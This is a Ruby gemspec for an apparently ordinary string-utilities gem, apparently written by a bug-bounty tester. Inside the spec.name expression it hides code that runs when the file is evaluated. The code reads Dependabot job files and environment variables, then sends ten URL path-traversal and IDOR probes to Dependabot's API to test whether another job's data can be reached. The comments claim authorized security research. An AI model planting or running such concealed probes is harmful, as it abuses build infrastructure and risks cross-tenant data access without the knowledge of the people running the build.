# frozen_string_literal: true
#
# v2.1 boundary-verification probe — orchestration-server URL-path traversal audit.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub
# program (programs/github/scope.md). Tester: mr_benty (CVP-approved). All
# probes within program-published scope; all artifacts sanitized; no third-
# party data accessed; PROBE-MARK encoded outputs only; own-tenant test.
#
# Scope: HYP-NEW-A — verify whether orchestration server's URL-path
# normalization differs from its JOB_TOKEN-to-jobId binding check, allowing
# own JOB_TOKEN to access another job's data through path-confusion.
#
# F007 documented cross-jobId baseline: token-job binding check returns
# 401/403 when jobId in URL doesn't match token's bound jobId.
#
# This probe tests URL-confusion variants from the in-container position.
# Proxy auto-attaches own JOB_TOKEN on outbound to dependabot-actions.githubapp.com.
#
# Variants tested (each compared against baseline of own jobId 200 + cross-jobId 401/403):
#   T1: /update_jobs/<own>/details                              (baseline 200)
#   T2: /update_jobs/<other>/details                            (baseline 401/403 per F007)
#   T3: /update_jobs/<own>%2F..%2F<other>/details              (encoded slash + dotdot)
#   T4: /update_jobs/<own>;<other>/details                     (semicolon)
#   T5: /update_jobs/<own>%00<other>/details                   (null byte)
#   T6: /update_jobs/<own>%252F..%252F<other>/details          (double-encoded)
#   T7: /update_jobs/<own>/../<other>/details                  (literal traversal)
#   T8: /update_jobs/<own>?id=<other>                          (query-param variant)
#   T9: /update_jobs/<own>%23<other>/details                   (fragment marker)
#   T10: /update_jobs/<own>%2e%2e/<other>/details              (encoded dotdot)
#
# Outcome interpretation:
#   - Any T3-T10 returning 200 with body length matching cross-jobId data
#     → URL-confusion IDOR. Cross-tenant write context accessible via own token.
#   - All T3-T10 returning 401/403/404 (matching cross-jobId baseline)
#     → boundary holds via correct URL parsing.
#
# All responses captured via PROBE-MARK encoding (sha256+length). No content
# surfaced beyond hash.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "json"
      require "digest"

      results = []
      probe_mark = "PROBE-MARK-HYP-NEW-A"

      own_job_id = nil
      begin
        jjson = File.read("/home/dependabot/dependabot-updater/job.json")
        parsed = JSON.parse(jjson)
        own_job_id = parsed.dig("job", "id") || parsed["id"]
      rescue
      end
      own_job_id ||= ENV["DEPENDABOT_JOB_ID"]

      results << "ownjob-#{own_job_id ? own_job_id.to_s[0, 12] : 'nil'}"

      api_url = ENV["DEPENDABOT_API_URL"] || "https://dependabot-actions.githubapp.com"

      if own_job_id
        # Pick a numerically-adjacent jobId as "other" for cross-jobId tests.
        # F007 documented adjacent IDs return 401/403; we use any non-own id.
        other_job_id = (own_job_id.to_i - 1).to_s

        # T1 — baseline own-jobId
        # T2 — baseline cross-jobId (per F007 should 401/403)
        # T3-T10 — path-confusion variants
        tests = [
          ["T1-own-baseline",        "/update_jobs/#{own_job_id}/details"],
          ["T2-cross-baseline",      "/update_jobs/#{other_job_id}/details"],
          ["T3-pct-slash-dotdot",    "/update_jobs/#{own_job_id}%2F..%2F#{other_job_id}/details"],
          ["T4-semicolon",           "/update_jobs/#{own_job_id};#{other_job_id}/details"],
          ["T5-nullbyte",            "/update_jobs/#{own_job_id}%00#{other_job_id}/details"],
          ["T6-double-encoded",      "/update_jobs/#{own_job_id}%252F..%252F#{other_job_id}/details"],
          ["T7-literal-traversal",   "/update_jobs/#{own_job_id}/../#{other_job_id}/details"],
          ["T8-query-id-override",   "/update_jobs/#{own_job_id}/details?id=#{other_job_id}"],
          ["T9-fragment-marker",     "/update_jobs/#{own_job_id}%23#{other_job_id}/details"],
          ["T10-encoded-dotdot",     "/update_jobs/#{own_job_id}%2e%2e/#{other_job_id}/details"],
        ]

        tests.each_with_index do |(label, path), i|
          begin
            uri = URI("#{api_url}#{path}")
            h = Net::HTTP.new(uri.host, uri.port)
            h.use_ssl = true
            h.open_timeout = 4
            h.read_timeout = 6
            req = Net::HTTP::Get.new(uri.request_uri)
            req["X-Probe-Mark"] = "#{probe_mark}-#{label}"
            rsp = h.request(req)
            body_len = rsp.body.to_s.length
            body_hash = Digest::SHA256.hexdigest(rsp.body.to_s[0, 1024])[0, 8]
            results << "T#{i+1}-#{label[0..18]}-s#{rsp.code}-l#{body_len}-h#{body_hash}"
          rescue => e
            results << "T#{i+1}-#{label[0..18]}-err-#{e.class.to_s.gsub(/[^A-Za-z]/, '')[0, 12]}"
          end
        end
      end

      summary = results.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

      begin
        File.open("/home/dependabot/HYP-NEW-A-MARKER.txt", "w") do |f|
          f.puts "#{probe_mark}-jobtoken-path-traversal-audit"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]
  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
